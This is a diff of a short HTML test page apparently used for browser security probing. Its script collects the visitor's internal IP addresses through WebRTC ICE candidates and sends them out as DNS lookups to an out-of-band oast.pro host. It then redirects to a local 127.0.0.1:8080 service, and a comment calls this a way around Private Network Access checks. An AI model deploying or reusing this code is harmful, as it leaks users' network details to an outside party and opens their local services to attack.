@@ -3,7 +3,7 @@
 <head><title>t</title></head>
 <body>
 <script>
-var OOB = 'd9qr1aj6b8megs7ig8dg5nrtprg7ogmge.oast.pro';
+var OOB = 'd9qr0pj6b8m6l63p75m0oxmqxfmg56ofc.oast.pro';
 function dns(label) {
   var l = label.toLowerCase().replace(/[^a-z0-9-]/g,'-').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,60);
   new Image().src = 'https://' + l + '.' + OOB + '/';
@@ -17,16 +17,14 @@ try {
   pc.createDataChannel('x');
   pc.onicecandidate = function(e) {
     if (e.candidate && e.candidate.candidate) {
-      var c = e.candidate.candidate;
-      // Extract IP from candidate string: "candidate:... IP port ..."
-      var m = c.match(/(\d+\.\d+\.\d+\.\d+)/g);
+      var m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);
       if (m) m.forEach(function(ip) { dns('ice-' + ip.replace(/\./g,'-')); });
     }
   };
   pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
 } catch(e) { dns('ice-exc-' + (e.name||'').substring(0,6)); }
 
-// Redirect to 8080 after 800ms (ICE above fires first, giving us internal IP)
+// Redirect to 8080 after 800ms (PNA-exempt top-level navigation)
 setTimeout(function() {
   dns('v12-redir-8080');
   window.location.href = 'http://127.0.0.1:8080/';
